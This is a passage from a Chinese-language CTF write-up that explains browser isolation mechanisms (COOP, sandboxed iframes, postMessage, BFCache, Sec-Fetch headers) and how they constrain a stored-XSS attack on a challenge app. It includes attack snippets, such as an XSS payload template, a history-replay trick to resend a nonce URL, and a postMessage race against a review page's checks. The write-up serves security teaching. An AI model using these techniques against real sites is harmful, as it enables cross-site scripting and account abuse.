折断后的遥控器叫"**死引用**"：变量还在你的代码里，调用它的方法也不报错，但**什么都不会发生**（所有 postMessage 消息根本不入队，查 `w.closed` 会显示 `true`，就像对面搬走了一样）。**别被 closed=true 骗了——那不是"从 B 读到了数据"，而是"墓碑"**：弹窗那边明明活着（用户正看着它），你读到的 true 是浏览器给作废引用立的墓碑（"此引用已作废"的固定呈现，与 B 的真实状态无关）；postMessage 在死引用上同样是无操作——白名单成员也救不了。所以死引用和白名单是**两个层面**的关卡：同源策略 = "通道活着，只许白名单操作"；COOP 死引用 = "通道整个不存在，白名单黑名单一起死"。电话类比：同源策略是"电话打通了但只许你说规定的话"；死引用是"号码被注销，听筒里永远是忙音"——听到忙音（closed=true）不等于听到对方的声音。另有一条边缘细则：无国籍（opaque）页面的弹窗有豁免条款，5.6 节有实测记录

```javascript
// A 页面（evil.com）
const w = window.open("https://challenge/review"); // B 带 COOP: same-origin
w.postMessage("hello", "*");  // ❌ 消息永远不会到达 B —— 被静默丢弃
```

记住结论（注意适用条件——**只对 `same-origin` 档成立**，默认的 unsafe-none 档谁都能同组）：**想给带 `COOP: same-origin` 的页面发消息，发送者必须和它同源，而且发送者自己也必须带 same-origin 档——"同源 + 同档"是两个并列的硬条件，缺一个都断**（发送者带 unsafe-none → 断；带 allow-popups → 也断，档不同；上面对照表第 2、3 行就是这个意思）。本题里 A（攻击者域的页面）和 B（挑战域的页面）**连第一步"同源"都过不了**（域名永远不同），所以不管 A 带什么档都必断；而攻击者脚本又永远不可能在挑战域上执行（下面一段展开）——两者合起来就是本题"不能用弹窗给 review 发消息"的根本原因。

上一句的"永远不可能"依据在哪？回头翻 1.2，找加粗的"封死结论"即可：题目只给 viewer 的 iframe 配了 `sandbox="allow-scripts"` 单令牌、故意不给 allow-same-origin，所以 S2 哪怕加载的是挑战域自己的 /sandbox 页，身份证也是"无国籍"（opaque）——它跑得再欢也不是"挑战域脚本"，与 review 永远不同源，COOP 这关永远过不去。

### 1.4 postMessage 与 e.source：窗口间的信件

被沙箱和同源策略层层隔开后，两个互访不了的窗口之间只剩一种通信办法——postMessage（"寄信"）。**先和 1.3 的"消息永远不会到达 B"对齐一下**（两句话看似矛盾，其实是两种前提）：postMessage 这个 API 本身不查身份、谁来调都行，但它能寄达的前提是**你手里握着对方窗口的有效引用**——sandbox / 同源策略隔开的窗口，引用还是活的，只是不许直接读对方 DOM，这时 postMessage 是真的能寄达的"唯一通道"。

注意"同源策略隔开的窗口"**不止 iframe 一种**。窗口之间要通信，前提是一方手里握着另一方的引用（遥控器）；按"这个引用是怎么拿到手的"分两大类，每一类都有具体的代码写法：

**第一类：同一个标签页里的 iframe 家族。** 一个页面（父）在身体里嵌了 iframe 小窗（子），两边各有一条路拿到对方的引用：

- **父拿子**：在父页面的代码里，写 `iframe元素.contentWindow`——比如 review 页面代码里写 `viewer.contentWindow`（viewer 是那个 iframe 的元素名），就拿到了小窗里那个窗口的引用，可以伸手向它寄信。
- **子拿父**：在 iframe 里页面的代码里，写 `window.parent`——意思是"装着我的那个父窗口"。比如 iframe 里的页面写 `parent.postMessage(...)`，信就寄给了装它的那个父窗口。
- **子拿顶层**：写 `window.top`——"这个标签页最外层的那个窗口"。嵌套只有一层时 top 和 parent 是同一个（本题 review↔viewer 就是一层，所以两个词等价）；嵌套好几层（孙窗嵌在子窗里）时，parent 只升一级、top 直达最外层。S2 的攻击代码用的是 `top.postMessage(...)`。
- **兄弟 iframe 互拿**：父页面里嵌了两个 iframe（甲和乙），它俩互相没有对方的名字，要经父页面中转——在甲的代码里写 `window.parent.frames[1]`（"父窗口的第二个子窗"，即乙）。拆开读：`window.parent` 是上面说过的"父窗口"，`.frames` 是**浏览器给每个窗口出厂自带的属性**（不是页面自己定义的变量）——"我的直接子窗清单"。排序规则：**按 iframe 标签在 HTML 文档里从上到下出现的顺序编号**（术语叫"DOM 树顺序"）——和加载完成的先后、id 名字、CSS 位置（display:none、挪到页面别处显示）都无关。两个补充性质：① 只存**直接**子窗——iframe 甲里再嵌的"孙 iframe"不在清单里，拿它要两跳（`frames[0].frames[0]`，父→甲→甲的子窗）；② 清单是**活的**——删掉第一个 iframe 后，原来的第二个自动前移顶上成为新的 `frames[0]`，索引永远反映当前文档的实时状态。`frames[1]` 拿到的引用和"第二个 iframe 的 contentWindow"是同一个东西。（写法说明：`window.` 前缀在代码里可以省略——`parent.frames[1]`、`frames[0]` 这些写法都合法、和全称完全等价，本文统一写全称只为好认。）

**第二类：开窗关系的两个独立窗口（弹窗场景）。** 1.3 讲过的 window.open：

- **开窗人拿弹窗**：A 页面代码里 `const w = window.open(网址)` 的返回值 w，就是那个新弹窗的引用（遥控器）。
- **弹窗拿开窗人**：弹窗里 B 页面的代码里写 `window.opener`——回头看一眼"是谁开的我"，拿到 A 的引用。

两类待遇相同：只要双方**跨源**，同源策略就只许白名单操作（postMessage 寄信、focus/blur、close、把对方 location 赋新网址导航走、读 closed/length/家庭关系引用这些），**不许读对方的 DOM 和变量**——没有 COOP 的年代，跨源的 A 开弹窗加载 B，A 能寄信、能导航 B、却读不了 B 的 DOM，和跨源 iframe 的待遇一模一样。

白名单是谁定的、谁执行？分两半答。

**执行者：浏览器**（和 1.2 追问段"所有门的最终执行者始终是浏览器"同一条原理）：你拿到的跨源窗口引用其实是个"遥控器外壳"（术语 WindowProxy），**每次**通过它读写属性，浏览器内核都先拦截检查——属性在白名单里就放行，不在就返回 undefined 或抛 SecurityError、写入被忽略。网页代码关不掉它，服务器也管不着。

**制定者：一份叫 HTML Standard 的行业规范，链条分三层**。第一层，规范是谁写的：HTML Standard 由 **WHATWG**（Apple/Google/Mozilla/Microsoft 等浏览器厂商组成的标准化工作组）维护，是挂在 html.spec.whatwg.org 的一份持续更新的"活文档"；跨源窗口允许哪些属性，规范里有专门条款逐项列死（术语"cross-origin accessible properties"），不是浏览器各自发挥。第二层，名单凭什么选这些成员——一条统一的设计原则：**"只许做动作、不许读数据"**。逐项过筛：postMessage（发消息，对方听不听自己决定）、focus/blur（聚焦/失焦）、close（关窗）、location **赋值**（把对方导航走——是动作；注意**读** location.href 被禁，那是读数据）全是动作；closed/length 是两个例外——它们严格说也是"读数据"（closed 读"窗口关没关"、length 读"嵌了几个 iframe"），但各自只能泄露一个比特/一个小数字，攻击者拿这点信息干不了任何坏事，规范权衡后**判定无害放行**（放行还有实用价值：开完弹窗后反复读 `w.closed`——w 是 window.open 返回的那个弹窗遥控器，closed 通过哪个引用读、读的就是那个引用指向的窗口（`w.closed` 问弹窗、`window.closed` 问自己）——变成 true 就知道用户手动关了弹窗，这是正经网站的常见需求。

本题 1.3 讲死引用时"查 w.closed 显示 true"表面看也是读这个属性——但那不是有效的读取，是浏览器对作废引用的固定表演，详见 1.3 的"墓碑"说明）；而 document、页面变量、location.href 读取一读就是一大片（整个页面内容/用户数据），泄露面大到必须全禁。第三层，规范怎么落到你电脑上：各浏览器厂商（Chrome 的 Blink、Firefox 的 Gecko、Safari 的 WebKit）按同一份规范各自实现进内核——规范没有法律强制力，但兼容性的事实逼着大家遵守同一份（某家私放属性进去，安全测试立刻能暴露）。类比 USB 接口标准：大家共同制定、各家照着造、谁造得不一样就插不上。

还有个容易混的问题：iframe **不设** sandbox 时，父子能互操作 DOM 吗？——**取决于同不同源，不取决于 sandbox**。同源父子（`a.com` 嵌 `a.com/x`、无 sandbox）可以**完整互操作**：子窗写 `parent.document` 直接读改父页面，父写 `iframe.contentDocument` 直接读改子页面——这是"同源"二字的本义待遇；跨源父子（无 sandbox）才降到白名单待遇。sandbox 的作用恰恰是**把本来同源的父子强制打成跨源待遇**（没收身份转 opaque，"和谁都跨源"）——review 和 viewer 里的 /sandbox 页都从挑战域加载、本同源，出题人用 sandbox 打散这层同源，才挡住 S2 直接 `parent.document` 读走 nonce（1.2"本题为什么故意不给 allow-same-origin"讲的就是这个）。

本题两类都出现了：review↔viewer 属第一类（主战场，所有 postMessage 攻防都在这对窗口间）；stage1（我们攻击的第一阶段页面，部署在攻击者自己的服务器上、机器人会整页打开它，4.1 详讲）↔弹窗本该属第二类、但被挑战的 COOP 升级成了断引用。这也带出了和 1.3 的最终对照：**同源策略/sandbox 收走的是"直接操作"（引用还在，信照寄）；COOP 连"通道"一起收走（引用折断成死引用，调 postMessage 不报错但信永不投递）**。本题后面所有 postMessage 攻防都发生在"引用还活着的沙箱场景"里。

它的工作方式：调用时指定收信窗口，浏览器把你的数据打包成一封"信"投到对方页面的信箱里；对方页面预先登记一个"收信员"（addEventListener("message", ...)），信到了就拆开处理。

```javascript
// 发送方（哪个源都可以寄，门卫不管寄信本身）
targetWindow.postMessage({ cmd: "hi" }, "*");
//            收信窗口 ↑        ↑信的内容     ↑"给任何身份的收信人都行"（目标不挑剔）

// 接收方：登记一个收信员，每封到达的信都会触发这段代码（本题 review 页的防线就是一个收信员）
window.addEventListener("message", (e) => {
  // e.source = 这封信的"寄件人"——寄件窗口的引用（相当于信封上的寄件人地址）
  if (e.source === viewer.contentWindow) {
    // 校验：寄件人是不是我自己的那个 iframe？不是就不处理
  }
});
```

`e.source` 是消息事件自带的"寄件人地址"。防御方通常拿它和"我预期的那个 iframe 的窗口"做**全等比较（`===`）**。注意 `===` 在这里比较的不是"内容是否一样"，而是"**是不是同一个东西**"——好比张三和张三的克隆人哪怕长得一模一样，也不是同一个人；两个窗口对象就算内部状态完全相同，只要不是同一个，`===` 就返回 false。**这个细节是整道题的胜负手，第六章会展开。**

### 1.5 BFCache 与 Sec-Fetch-Site：浏览器的历史缓存

**BFCache（前进/后退缓存）**：你点浏览器的"后退"按钮时，浏览器常常**不重新发请求**，而是把之前冻结的整个页面（连同页面里所有变量、脚本运行状态）原样解冻给你看——又快又省流量。这个缓存容量有限（Chrome 大约存 6 个页面），塞满后再后退，最旧的会被扔掉。

**"历史导航"**：就是你点浏览器的后退/前进按钮（或代码调用 `history.go()` / `history.back()`）时发生的页面切换。浏览器会把每个标签页访问过的页面按顺序记成一份清单（4.1 节会画给你看），历史导航就是在这份清单里向回/向前跳一格。

**Sec-Fetch-Site 请求头：浏览器"自动附加"在每个请求上的一行来路声明，替服务器验明这个请求从哪来。** 逐层拆开讲：

- **"请求头"给谁看**：不是给浏览器自己看的，是**发给服务器看的**——请求头是每个 HTTP 请求自带的一页"寄件单"，服务器收到请求时逐行读它。Sec-Fetch-Site 就是寄件单里的一行。
- **"自动附加"意味着什么**（对照：普通请求头如 User-Agent，网页代码可以随意增删——而这行字由**浏览器内核自动填写**）：它属于"禁止修改的请求头"（forbidden header）——网页里的 JavaScript **碰不到它**，写不了也改不了（`fetch`/XHR 里硬塞会被浏览器直接忽略）。这是它能当安全依据的根本原因：服务器读到的必然是浏览器的话，不是攻击者的话。
- **它声明的是"关系"，不是"地址"**（这点直接回应"opaque origin 还有什么意义"）：它**不写**"我来自 xxx.com"，只写"**我和目标站点什么关系**"——同源 / 同站 / 跨站 / 没有来源，就这几种。无国籍（opaque）页面发请求时，这个头标 `cross-site`——服务器只学到"来者跨站"这一丁点信息（2 个比特的事），**依然不知道具体是谁**。所以 opaque 的意义完好无损：它保护"我具体是谁"，Sec-Fetch-Site 只泄露"我和你近不近"。

四个取值（记住最后两个的分工，本题全靠它）：

| 值 | 什么时候出现 |
|---|---|
| `same-origin` | 发请求的页面和目标网址**同源**（JS 跳转 `location.href=同源网址`、同源页面里的 fetch/img 都算） |
| `same-site` | 同一网站的不同子域（如 a.com 的页面请求 b.a.com）——本题不涉及 |
| `cross-site` | 从**别的网站**发起（别的网站的页面嵌你的图片、无国籍页面的请求、跨站 JS 跳转） |
| `none` | **用户直接操作**且请求**真的发出去了**：地址栏输入网址回车、点书签、或历史导航**缓存未命中回落到真实请求**（见下） |

`none` 行里"历史导航"要特别展开（它和 1.5 开头讲的 BFCache 直接相关）：历史导航（后退/前进）**先查 BFCache**——命中就直接解冻旧页面，**根本不发请求**（连请求都没有，寄件单自然也不存在，服务器什么都收不到）；**不命中**才向服务器发真实请求，此时浏览器标 `none`。所以"历史导航产生 none"的完整条件是"历史导航 **且** 缓存未命中"——这正是第四章"挤出链"存在的原因：要人为保证缓存里没有目标页。

**Sec-Fetch-Dest 请求头：同一族里的另一个自动头，声明"这次请求想拿什么类型的东西"。** 和 Sec-Fetch-Site 一样由浏览器自动填、JS 改不了。常见值：`document`（要一整个网页，用于整页打开）、`iframe`（往嵌入框里装页面）、`script`（加载脚本）、`image`（加载图片）、`empty`（只要数据，fetch/XHR 是它）。

**本题服务器怎么用这两个头（"合起来"的准确含义）**：服务器代码里写死的过滤规则是**逐个头读、逐个比对，两个必须同时满足**——

1. `Sec-Fetch-Site: none` → 来路必须是"用户直接操作"（挡住所有 JS 跳转：JS 跳转只能产生 same-origin/cross-site，见上表）
2. `Sec-Fetch-Dest: document` → 用途必须是"整页打开"（挡住 iframe 嵌入、fetch 取数据、图片加载——这些 Dest 分别是 iframe/empty/image）

两条各挡一类伪造，缺一条都不放行——这就是"合起来"的意思：不是浏览器有什么"合并机制"，而是服务器的两道 if 检查都通过才认账。外加第三个隐含条件"请求真的到了服务器"（BFCache 命中时连请求都没有，前面两行头根本无从检查——九道门〔挑战服务器设的九个条件，2.3 详列〕不执行，白干）。

**为什么攻击者只能走"历史导航"这条路**：普通 JS 跳转（`location.href=...`）发请求时，浏览器按"当前页面和目标网址同不同源"自动填 same-origin 或 cross-site——**永远填不出 none**；而这族头 JS 又伪造不了（前面讲过）。剩下唯一能**用代码**产生 `none` 的方式：`history.go()` / `history.back()`——它们语义上就是"用户按了后退/前进键"，浏览器按用户操作对待（标 none），且代码可以调用。再叠加"必须非缓存"（BFCache 命中不发请求），完整公式：**`history.go()`/`history.back()` + 缓存未命中 = 程序员能拿到 `none` 的唯一路径**——这就是第四章整章要工程化的东西。

## 第二章：题目结构——端点、机器人与九道门

这一章把题目拆开给你看：有哪些接口、机器人干什么活、flag 藏在几道门后面。

### 2.1 端点清单

先用一句话说明这张表的读法：**"端点"是服务器对外提供的一个个功能入口**（你可以理解为"网站的一个个页面或接口"），浏览器访问不同路径触发不同功能。"方法"是访问方式（GET=打开/获取、POST=提交数据）。"权限要求"是这道门检查什么才能进。

整个题目是 Express + EJS 应用（Express 是 Node.js 最常用的 Web 框架，EJS 是往 HTML 模板里填数据的模板语言），核心接口一共 8 个，按"无权限→有权限"排列：

| 端点 | 方法 | 权限要求 | 功能 |
|------|------|---------|------|
| `/create` | POST | 无 | 创建笔记（title ≤10 字符，html ≤128 字符） |
| `/note/:id` | GET | 无 | 笔记预览页（HTML 转义显示 + 严格 CSP） |
| `/report` | POST | 无 | 提交 URL 给机器人审查（同一时间只能有一个审查） |
| `/reports/check` | GET | admin | **九道门的守门人**：第一次访问标记 visited，第二次访问过全检后渲染 XSS 页 |
| `/api/flag` | GET | admin | 直接返回 flag JSON |
| `/review` | GET | admin + rid 匹配（rid 见表下名词表） | 渲染审查页（含 message 监听器和 viewer iframe） |
| `/sandbox` | GET | admin + rid 匹配 + document 存在 | 渲染 `<script src=攻击者的URL>`，带全套沙箱 CSP |
| `/complete` | POST | admin + id/state 匹配 + prepared | **唯一能把 approved 置 true 的入口** |

先别急看安全头，这张表里藏着整道题的剧情骨架，值得停 30 秒梳理一遍：

- 前三个接口（create/note/report）不需要权限——任何人都能创建笔记、看笔记、提交审查，这是攻击的**入口**。
- 后五个全部要求 admin（机器人身份）——攻击者没有这个身份，所以后五个接口对攻击者"看得见摸不着"，只能想办法**借机器人的浏览器**去访问。
- `/reports/check` 是全题最特殊的接口（"两次访问"设计，2.3 详讲）——flag 的九道门全在它的第二次访问上。
- `/complete` 是"批准按钮"——全题唯一的 approved 入口，第五章和第六章都在打它的主意。

全站响应头（helmet 中间件默认加）还有三个安全头，后面会反复用到，先各给一句人话解释：

- `COOP: same-origin`——见 1.3：跨站弹窗的遥控器折断
- `X-Frame-Options: SAMEORIGIN`——**别的网站不许把这个页面嵌进自己的网页里**（用 `<iframe src="挑战页面">` 会被浏览器拒绝加载）
- `CORP: same-origin`——**别的网站加载这个页面的资源会被拦**（evil.com 的页面里写 `<script src="挑战页面/...">` 或 `fetch("挑战页面/...")`，浏览器直接拦下）

表格里还有三个名词需要先认识（全文反复用）：
- **rid** = report id，**报告编号**。你每次提交 report，服务器生成一个随机编号并在后续所有环节用它对号入座（机器人流程的④还会把这个编号附加到你提交的网址后面，你的攻击页面由此知道它）。
- **currentReview** = 服务器内存里代表"**当前这一次审查**"的对象（一次 report 对应一次），里面存着这轮审查的全部状态：编号、nonce 暗号、是否 prepared/approved/used 等。九道门的检查查的就是它的字段。
- **document** = currentReview 里的一个字段——"这次审查要加载的**攻击者脚本地址**"（注意：和 1.2 第三层里"读不到里面的 `document`"的 document 是**两码事**——那个指网页的文档对象，这个是本题审查数据的字段名，恰好重名）。你在提交 report 后、访问 /review 时通过 `?u=` 参数指定，服务器记进 currentReview.document；之后 /sandbox 才知道该加载谁的脚本。原版解法里"开弹窗加载 /review 设置 document"说的就是：先访问一次 /review 把脚本地址登记进服务器。

### 2.2 机器人的固定流程

提交 report 后，机器人（**puppeteer**：一个用程序远程控制 Chrome 浏览器的工具，可以在代码里指挥浏览器"打开某网址、等页面加载完"——效果等同于一个听命令的真人用户）带着 **admin 会话 Cookie** 依次做四件事：

```javascript
// bot.js 的等价伪代码（goto = 让浏览器整页打开某网址；fetch = 服务器直接发请求，不经过页面）
goto("/reports/check?rid=<报告id>&state=<随机nonce>");
// ① 打开 check 页——服务器记下"这轮审查已有人来看过第一眼"（visited=true）
goto("/api/flag");
// ② 打开 flag 页——flag 从此被缓存在服务器的审查对象里（后面 XSS 阶段读的就是这份缓存）
await fetch("/reports/arm/<报告id>", {method:"POST", headers:{"X-Bot-Token": 机器人口令}});
// ③ 调用服务器的"就绪"接口（arm=武装）——附上只有机器人知道的口令（X-Bot-Token），
//    服务器验口令后把本轮审查标记为 prepared（已就绪）
goto(你提交的URL + "?rid=<报告id>");
// ④ 整页打开你提交的网址，并把你这轮审查的编号（rid）附在网址后面——
//    你的攻击页面从网址里读出 rid 就知道自己在哪轮审查里；之后机器人停留 10 秒才关浏览器
```

注意 ① 的网址里有个值得停下来看的参数：`state=<随机nonce>`。拆开讲：nonce 是"一次性的随机暗号"（本题为 128 位随机数，长这样：`d415e560eb2859c79fcaae98cc23d60a`）。服务器在机器人出发前生成它、塞进 check 的网址里；将来 check 再收到任何请求时，会核对请求网址里的暗号是否与记录一致——暗号对不上就拒收，防止有人凭空伪造"二次访问"。**这个暗号我们（攻击者）从头到尾不知道也不需要知道**——第四章的历史回放会原样重发整个网址（暗号随网址自动带上），这是后文最巧的一环。它同时是九道门的第七道。

### 2.3 九道门：check 的二次访问条件

check 这个接口有个"两次访问"的设计：**第一次**被访问时，服务器只做一件事——记下"来过了"（visited=true），返回一个普通页面；**第二次**再被访问时，服务器才亮出九道门：全部通过，就把你的笔记内容原样渲染成网页（也就是 XSS 落地点）；任何一道不过，返回 403 拒绝。九道门就是下面代码里的九个条件。

flag 有两条出口。第一条 `/api/flag`：接口只认机器人（admin 身份），所以机器人的浏览器里随时能打开看到——但攻击者自己的浏览器打开这个接口只会收到 403 拒绝（没有机器人身份）。第三章会证明：就算用各种花招借机器人的浏览器去看，也会被浏览器的层层安全机制挡在"看到"之外。和 `/reports/check` 的**二次访问**——它会把你的笔记 HTML **不转义**地渲染出来。这意味着：如果我们提前在"笔记"里藏了恶意脚本代码，等服务器把笔记原样渲染成网页时，脚本就会在挑战网站的域名下执行——这类"存进去的炸弹"叫**存储型 XSS**（XSS = 在别人网站的页面里塞进自己的脚本并执行）。二次访问要同时满足九个条件。先给九道门一个"人话速览"（代码在下面，先建立直觉再读代码）：

门1 已经来过一次（visited）；门2 网址里带的笔记编号真实存在（note）；门3+4 请求像真人操作（两个标记头）；门5 审查还在进行中（没结束没消费）；门6 报告编号对得上号（rid）；门7 暗号对得上（state = nonce）；门8 已就绪（prepared，机器人自动完成）；门9 没被用过（used = false）。——九道门里八道都能想办法过，唯独"门内那颗 approved 星标"（门 8.5 的隐藏门，见下）没有自动路径。

```javascript
// 服务端二次访问核心逻辑（简化）
if (visited) {                        // 门1: 机器人已访问过一次
  const note = notes.get(noteId);     // 门2: ?note= 指向真实存在的笔记
  if (!policy(req)) return 403;       // 门3+4: Sec-Fetch-Site: none + Sec-Fetch-Dest: document
  if (!consumeReport(req)) return 403;// 门5~9 见下
  res.render("review-document", { note });  // ← XSS！note.html 原样注入
}

function consumeReport(req) {
  return currentReview               // 门5: 审查还在进行中
    && currentReview.id === rid      // 门6: rid 匹配
    && state === currentReview.nonce // 门7: state 匹配那个 128 位随机数
    && currentReview.prepared        // 门8: prepared（机器人流程的③自动置 true）
    && currentReview.approved        // ★ approved：九道门里唯一没有"自动满足"路径的，
                                     //   整道题的核心难题（3.4 总览表中以"—"标出）
    && !currentReview.used;          // 门9: 只能消费一次
}
```

九个条件里，除了 **approved**，其余八个都可以通过"让机器人浏览器替我们导航"来满足。approved 只能靠 `POST /complete` 设置，而这个 POST 需要 nonce——攻击者不知道 nonce，所以唯一出路是**让知道 nonce 的页面自己发这个请求**。

### 2.4 知道 nonce 的页面：review.ejs 逐行精读

先补一个前面遗留的术语：`/sandbox` 页面里的 `<script nonce="xxx" src="...">` 是一种 CSP 机制——服务器给页面定规矩"只许带正确一次性令牌（nonce）的脚本运行"，确保攻击者就算能往页面塞 HTML，塞进去的 `<script>` 也因为没带令牌而被拒绝执行。

**但本题的机制不一样**：题目规定，访问 /review 时可以在网址里带一个 `?u=脚本地址` 参数——这是攻击者脚本的唯一合法入口（出题人故意留的门）。服务器会把我们的脚本地址登记下来（记进 2.1 名词表的 document 字段），并在渲染 /sandbox 页面时**亲手把我们的脚本配上令牌装进去**——所以我们的脚本（S2）能合法运行在沙箱里。

带着这个背景读 `/review` 渲染的页面：它内嵌了 nonce，并且有一个"验证通过就替你 POST /complete"的收信员——这是整道题的心脏：

```html
<iframe id="viewer" sandbox="allow-scripts" src="/sandbox?rid=..."></iframe>

<script nonce="...">
  const viewer = document.getElementById("viewer");
  const report = { id, state };   // ← nonce 就躺在这里（服务端渲染进来的）
  let closing = false;

  window.addEventListener("message", (e) => {
    // ★ 全题核心防线：两个条件都满足才放行
    if (!closing || e.source === viewer.contentWindow) return;
    // 只要有"非 viewer 窗口"在 closing 之后发来消息：
    fetch("/complete", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(report),  // ← 用它自己内嵌的 nonce 替你提交！
    });
  });

  viewer.addEventListener("load", () => {
    if (closing) return;
    closing = true;                                  // viewer 首次加载完成后解锁
    viewer.src = `/sandbox?rid=...&end`;             // 并立刻把 viewer 换成空白文档
  });
</script>
```

代码逐行解读（出题人写的每一段在干什么）：

- `<iframe id="viewer" ...>`：页面上嵌一个沙箱小窗口（1.2 讲过），初始装的是 /sandbox 页——也就是装着**我们的攻击脚本 S2**。给这个 iframe 起的元素名叫 viewer。
- `const report = { id, state }`：服务器渲染页面时，把这轮审查的编号和 **nonce 暗号**直接写死在这行代码里——所以"知道 nonce 的页面"就是 review 自己。
- `let closing = false`：一个开关，初始关着。含义是"viewer 还没加载完第一遍"。
- **第一段（message 收信员）**：收到一封信时做两道检查——①开关开了吗（closing 必须为 true，即 viewer 已加载完）？②寄件人是 viewer 自己吗（是就拒收）？**两道都过，就自动发 POST /complete，把 report（含 nonce）作为内容交给服务器——approved 开关就这样被打开。**注意：发请求用的是 review 页面自己的身份（自动带 admin Cookie），且 nonce 是它自己体内写死的——我们什么都不用提供。
- **第二段（viewer 的 load 监听）**：等 viewer 第一次加载完成 → 把开关 closing 置 true（此后上面的收信员才可能放行）→ 立刻把 viewer 的内容换成一张空白页（`&end` 参数让 /sandbox 返回空文档）。这个"换空白页"的动作后面会成为整道题的胜负手（第六章）。

翻译成人话，这个页面在等一件事：**"在我加载完 viewer 之后，任何一个不是我亲儿子（viewer）的窗口给我发消息，我就替它去点批准按钮。"**

所以整道题的终极问题浓缩成一句话：

> **怎么让一个"不是 viewer"的窗口，在 closing=true 之后，给 review 发一条 postMessage？**

viewer 自己发会被过滤（`e.source === viewer.contentWindow` 直接 return），而别的窗口——弹窗被 COOP 断、别的域发不过来、沙箱里的脚本连开窗口都不许……这就是第五章死亡迷宫的由来，也是第六章 pagehide 竞态一击致命的地方。

## 第三章：为什么 flag 只有一条路——攻击面收敛分析

拿到源码后我们做的第一件事不是找洞，而是**穷举出口**：flag 到底有几种离开服务器的可能？结论是只有一条路。这一章展示收敛过程——"排除法"在 CTF 里和"找洞"同样值钱。

### 3.1 出口一：`/api/flag` 直接读 —— 三层封死

flag 就躺在这个接口里，机器人浏览器也确实访问过它。攻击者页面能读到吗？

逐种尝试、逐种被挡的全过程：

- **尝试 1：在攻击者页面里 `fetch("/api/flag")`。** 请求发出去了，但 1.1 讲过——从别的网站发的请求不带 admin Cookie（SameSite=Lax 的"严"处）。服务器看到的请求没有身份，回复 403 拒绝。死。
- **尝试 2：把 flag 页嵌进 iframe（`<iframe src="/api/flag">`）。** 想嵌就撞上 2.1 讲过的 X-Frame-Options 头——浏览器直接拒绝在嵌入框里加载挑战页面。死。
- **尝试 3：当脚本加载（`<script src="/api/flag">`）。** 撞上 CORP 头——别的网站加载挑战页面的资源，浏览器直接拦。死。
- **尝试 4：开弹窗整页打开 /api/flag。** 这个居然能打开——flag 就显示在弹窗里！但 1.3 讲过 COOP：弹窗一加载挑战页面，攻击者手里的遥控器就被折断——**flag 明明显示在几厘米外的弹窗里，攻击者的代码就是够不着**。死得最憋屈。

四种姿势全灭，共同点是什么：**都不在挑战域的"同源圈内"。而 1.2 讲过第二、三层的规则——只有同源才读得到内容。推论：读 flag 必须让 JavaScript 跑在挑战网站自己的某个页面上**——也就是需要一个挑战域上的 XSS（在别人网站页面上跑自己代码的技术）。下一章的问题从此变成"挑战域哪里能注入代码"。

### 3.2 出口二：伪造 admin 会话 —— 随机 token 封死

想直接伪造机器人的 admin 身份？唯一的入口是 `/reports/session`——必须附上正确的机器人口令（X-Bot-Token）才行。我们试了 25 个以上候选口令（源码默认值 dev-token、配置文件里的 local-bot-token 等各种常见组合），全部被拒（403）——远程部署时平台注入了随机口令，猜不出来。身份伪造这条路封死。

（顺带记录我们试过的另一条路——并发攻击："并发"= 趁服务器正在处理某次审查的十几秒里，同时再发一个读 flag 的请求。本地复刻环境里我们验证过这招能直接拿 flag——但它需要 admin 的 Cookie，远程同样死在上面这个 token 上。）

### 3.3 出口三：review-document 的存储型 XSS —— 唯一活路

全站找一个"同时满足三个条件"的页面：①在挑战域上（能同源读数据）②内容有攻击者可控的部分 ③没有 CSP 限制（脚本不被拦）。唯一同时满足三者的，就是 check 二次访问成功后渲染的 `review-document.ejs`（把你的笔记渲染成网页的那个页面）：

```html
<body>
<%- note.html %>   <!-- 这行是模板语法：<%- 表示"不转义输出"——你笔记里写的任何字符都原样进入网页 -->
</body>
<!-- 且这个响应没有任何 CSP 头——页面里出现 <script> 也会直接执行 -->
```

"不转义输出"意味着什么，展开说透：你在 128 字节笔记里写 `<img src=q onerror=恶意代码>`，如果输出是转义的（`&lt;img...`），用户看到的只是一段**文字**（"小于号 img..."，无害）；不转义时，浏览器把它当成**真的 HTML 标签**去解析——img 标签创建、加载失败、onerror 里的恶意代码执行——全程发生在挑战网站的域名下，带着机器人的身份。所以整条攻击链的目标就此确定：**凑齐九个条件，让 check 二次访问成功渲染 XSS**。

### 3.4 九条件的满足路径总览

（下表是全题攻略的"总地图"——九道门各用什么招过、在哪章详讲，一屏全收。# 列沿用第二章的门编号，所以行的顺序看起来是跳的：先列自动满足的、再列需要攻击者主动构造的。"满足方式"列里标"自动"的都不用操心——机器人自己就完成了；标其他的是攻击的真正战场。）

| # | 条件 | 满足方式 | 章节 |
|---|------|---------|------|
| 1 | visited | 机器人第一次访问自动置 true | 自动 |
| 2 | note 存在 | 检查 ?note= 指向的笔记是否真实存在——所以提交 report 时就要在网址里带上我们提前创建好的笔记编号 | 自动 |
| 5 | 审查进行中 | 在机器人 10 秒停留窗口内完成一切 | 时序 |
| 6 | rid 匹配 | 机器人给我们的页面 URL 附加了 `?rid=`，读出来用 | 自动 |
| 8 | prepared（已就绪） | 机器人流程的③自动调用 arm 接口置 true | 自动 |
| 9 | 未消费（used=false） | 这轮审查没被消费过——check 二次访问成功一次就会把 used 置 true，所以只能成功一次 | 自动 |
| 3+4 | Sec-Fetch-Site: none + Dest: document | **BFCache 挤出 + history.go 历史回放** | 第四章 |
| 7 | state 匹配 nonce | 同上——历史回放**不需要知道** nonce，URL 原样重发 | 第四章 |
| — | **approved** | **pagehide 竞态骗过 review 的消息校验** | 第五、六章 |

> 门 7（nonce）的巧劲值得单独细讲。问题：二次访问必须带对暗号，但暗号只有机器人的浏览器"知道"（它藏在机器人第一次访问 check 时的网址里）。攻击者的机会：**网址会留在浏览器的历史记录里**——机器人当初整页打开过 `check?rid=xxx&state=NONCE`，这条完整网址至今躺在后退按钮的清单里。第四章的做法：用代码让浏览器"后退"到那条历史（`history.go(-10)`）——后退导致的重新请求会把**当年的网址原样重发**，暗号随网址自动带上。所以从头到尾我们都不需要知道暗号的值——**让浏览器替我们原样重发，就绕过了"必须知道"这个前提**。这是"历史回放"类技巧的通用价值。

### 3.5 彩蛋：revenge 相对原版改了什么（以及原版怎么解）

revenge 与原版 readonce 的 diff 只有 4 处实质改动：

```diff
+ /review  增加权限检查：必须是 admin（机器人）会话才能访问
+ /sandbox 增加权限检查：同上
+ /sandbox 的 CSP 增加 "sandbox allow-scripts" 指令      ← 封死原版解法的钥匙（1.2 讲过：响应头也能没收身份证）
+ /sandbox 的 CSP 增加 "frame-ancestors 'self'"          ← 只许挑战网站自己的页面嵌它
```

